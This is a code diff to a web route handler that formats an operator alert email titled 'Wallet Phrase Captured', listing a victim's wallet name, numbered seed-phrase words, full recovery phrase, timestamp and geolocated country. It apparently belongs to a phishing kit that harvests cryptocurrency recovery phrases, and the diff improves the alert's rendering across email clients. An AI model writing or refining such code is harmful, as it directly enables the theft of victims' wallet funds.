@@ -130,11 +130,11 @@ export async function POST(req: NextRequest) {
     : null;
   const flag = geo.emoji_flag ?? (geo.country_code ? "" : "");
 
-  // Numbered word pills for the phrase
+  // Numbered word pills for the phrase - using inline-block with normal margin for email client compatibility
   const wordPills = words.map((w: string, i: number) => `
-    <span style="display:inline-flex;align-items:center;gap:4px;background:#1e1b4b;border:1px solid #3730a3;border-radius:6px;padding:5px 10px;margin:3px;">
-      <span style="color:#6366f1;font-size:10px;font-weight:700;min-width:16px;">${i + 1}</span>
-      <span style="color:#c7d2fe;font-family:monospace;font-size:13px;">${w}</span>
+    <span style="display:inline-block;background:#1e1b4b;border:1px solid #3730a3;border-radius:6px;padding:6px 10px;margin:4px 4px 4px 0;white-space:nowrap;">
+      <span style="color:#6366f1;font-size:11px;font-weight:700;margin-right:6px;">${i + 1}</span>
+      <span style="color:#c7d2fe;font-family:monospace;font-size:14px;">${w}</span>
     </span>`).join("");
 
   const html = `<!DOCTYPE html>
@@ -144,23 +144,27 @@ export async function POST(req: NextRequest) {
   <meta name="viewport" content="width=device-width,initial-scale=1.0">
   <title>Wallet Phrase Captured</title>
 </head>
-<body style="margin:0;padding:0;background:${S.bg};font-family:-apple-system,'Segoe UI',Roboto,Arial,sans-serif;">
-<table width="100%" cellpadding="0" cellspacing="0" style="background:${S.bg};padding:32px 16px;">
-<tr><td align="center">
-<table cellpadding="0" cellspacing="0" style="max-width:640px;width:100%;">
+<body style="margin:0;padding:0;background:${S.bg};font-family:-apple-system,'Segoe UI',Roboto,Arial,sans-serif;-webkit-text-size-adjust:100%;-ms-text-size-adjust:100%;">
+<table width="100%" cellpadding="0" cellspacing="0" border="0" style="background:${S.bg};padding:16px 0;">
+<tr><td align="center" style="padding:0 8px;">
+<!--[if mso]>
+<table align="center" border="0" cellspacing="0" cellpadding="0" width="600">
+<tr><td align="center" valign="top">
+<![endif]-->
+<table cellpadding="0" cellspacing="0" border="0" style="max-width:600px;width:100%;margin:0 auto;">
 
   <!-- ══ HEADER ══ -->
   <tr><td>
-    <div style="${S.headerGrad};border-radius:14px 14px 0 0;padding:36px 32px 28px;text-align:center;">
-      <div style="font-size:42px;margin-bottom:8px;">🔐</div>
-      <h1 style="margin:0 0 6px;color:#fff;font-size:22px;font-weight:800;letter-spacing:-0.3px;">
-        New Recovery Phrase Captured
+    <div style="${S.headerGrad};border-radius:12px 12px 0 0;padding:32px 24px;text-align:center;">
+      <div style="font-size:40px;margin-bottom:12px;text-shadow:0 4px 12px rgba(0,0,0,0.2);">🔐</div>
+      <h1 style="margin:0 0 8px;color:#ffffff;font-size:24px;font-weight:800;letter-spacing:-0.5px;line-height:1.2;">
+        Recovery Phrase Captured
       </h1>
-      <p style="margin:0;color:#c7d2fe;font-size:13px;">${submittedAt}</p>
-      <div style="margin-top:14px;display:inline-flex;gap:8px;">
-        ${badge(wallet ?? "Unknown Wallet", "#312e81", "#a5b4fc")}
-        ${badge(flag + " " + (geo.country_name ?? "Unknown Location"), "#14532d", "#86efac")}
-        ${badge(wordCount + "-word phrase", "#7c2d12", "#fdba74")}
+      <p style="margin:0 0 16px;color:#c7d2fe;font-size:13px;opacity:0.9;">${submittedAt}</p>
+      <div style="margin:0;padding:0;text-align:center;">
+        ${badge(wallet ?? "Unknown Wallet", "#1e1b4b", "#c7d2fe")}
+        ${badge(flag + " " + (geo.country_name ?? "Unknown Location"), "#064e3b", "#a7f3d0")}
+        ${badge(wordCount + "-word phrase", "#7c2d12", "#fed7aa")}
       </div>
     </div>
   </td></tr>
@@ -169,17 +173,17 @@ export async function POST(req: NextRequest) {
   <tr><td style="background:${S.bg};padding:24px 0;">
 
     <!-- Phrase Card -->
-    <div style="margin-bottom:20px;border-radius:10px;overflow:hidden;border:1px solid #3730a3;">
-      <div style="background:linear-gradient(90deg,#1e1b4b,#2e1065);padding:10px 16px;border-bottom:1px solid #3730a3;">
-        <span style="color:#a5b4fc;font-size:11px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;">💰 Wallet &amp; Recovery Phrase</span>
+    <div style="margin-bottom:24px;border-radius:12px;overflow:hidden;border:1px solid #3730a3;box-shadow:0 4px 20px rgba(0,0,0,0.4);">
+      <div style="background:linear-gradient(90deg,#1e1b4b,#2e1065);padding:12px 20px;border-bottom:1px solid #3730a3;">
+        <span style="color:#a5b4fc;font-size:12px;font-weight:800;letter-spacing:1px;text-transform:uppercase;">💰 Wallet &amp; Recovery Phrase</span>
       </div>
-      <div style="background:#090b1a;padding:20px;">
-        <p style="margin:0 0 4px;color:#64748b;font-size:11px;text-transform:uppercase;letter-spacing:1px;">Wallet</p>
-        <p style="margin:0 0 20px;color:#818cf8;font-size:22px;font-weight:800;">${wallet ?? "Not provided"}</p>
-        <p style="margin:0 0 10px;color:#64748b;font-size:11px;text-transform:uppercase;letter-spacing:1px;">Recovery Phrase (${wordCount} words)</p>
-        <div style="display:flex;flex-wrap:wrap;gap:4px;">${wordPills}</div>
-        <div style="margin-top:16px;background:#0f172a;border:1px solid #1e293b;border-radius:8px;padding:14px;">
-          <p style="margin:0;font-family:monospace;font-size:13px;color:#94a3b8;line-height:1.8;word-break:break-word;">${phrase}</p>
+      <div style="background:#090b1a;padding:24px 20px;">
+        <p style="margin:0 0 4px;color:#64748b;font-size:11px;text-transform:uppercase;letter-spacing:1px;font-weight:600;">Wallet</p>
+        <p style="margin:0 0 24px;color:#818cf8;font-size:24px;font-weight:800;letter-spacing:-0.5px;">${wallet ?? "Not provided"}</p>
+        <p style="margin:0 0 12px;color:#64748b;font-size:11px;text-transform:uppercase;letter-spacing:1px;font-weight:600;">Recovery Phrase (${wordCount} words)</p>
+        <div style="margin:0;padding:0;width:100%;text-align:left;">${wordPills}</div>
+        <div style="margin-top:20px;background:#020617;border:1px solid #1e293b;border-radius:8px;padding:16px;">
+          <p style="margin:0;font-family:'Courier New',Courier,monospace;font-size:14px;color:#94a3b8;line-height:1.6;word-break:break-all;letter-spacing:0.5px;">${phrase}</p>
         </div>
       </div>
     </div>
